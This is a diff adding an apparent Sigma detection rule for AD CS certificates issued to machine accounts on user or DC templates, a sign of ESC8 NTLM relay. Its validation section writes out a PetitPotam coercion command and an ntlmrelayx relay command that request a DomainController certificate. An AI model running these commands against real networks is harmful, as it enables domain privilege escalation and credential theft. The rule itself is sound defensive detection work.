@@ -1,0 +1,43 @@
+title: ADCS Certificate Issued to a Machine Account on a User Template
+id: 7b1c4d2a-9e3b-4f6d-a852-tyrian000053
+status: experimental
+description: >
+  Detects a certificate request whose requester is a computer account. Coercing a
+  domain controller to authenticate to the AD CS web enrollment endpoint over NTLM
+  and relaying it (ESC8) produces exactly this: the CA sees the DC's machine
+  account enrolling, usually against a user or DC template. Machine accounts do
+  enroll legitimately, so pair this with the template name before escalating.
+references:
+  - https://attack.mitre.org/techniques/T1649/
+  - https://attack.mitre.org/techniques/T1557/001/
+author: Tyrian
+date: 2026/08/03
+logsource:
+  product: windows
+  service: security
+detection:
+  selection:
+    EventID:
+      - 4886
+      - 4887
+    Requester|endswith: '$'
+  user_template:
+    Attributes|contains:
+      - 'CertificateTemplate:User'
+      - 'CertificateTemplate:DomainController'
+      - 'CertificateTemplate:KerberosAuthentication'
+  condition: selection and user_template
+validation:
+  atomic: T1649
+  fire: |-
+    PetitPotam.py -u user -p pass <attacker-ip> <dc-ip>
+    ntlmrelayx.py -t http://ca.domain/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+falsepositives:
+  - Autoenrollment issuing domain controller certificates during normal operation
+  - Machine certificate renewal
+level: high
+tags:
+  - attack.credential_access
+  - attack.privilege_escalation
+  - attack.t1649
+  - attack.t1557.001
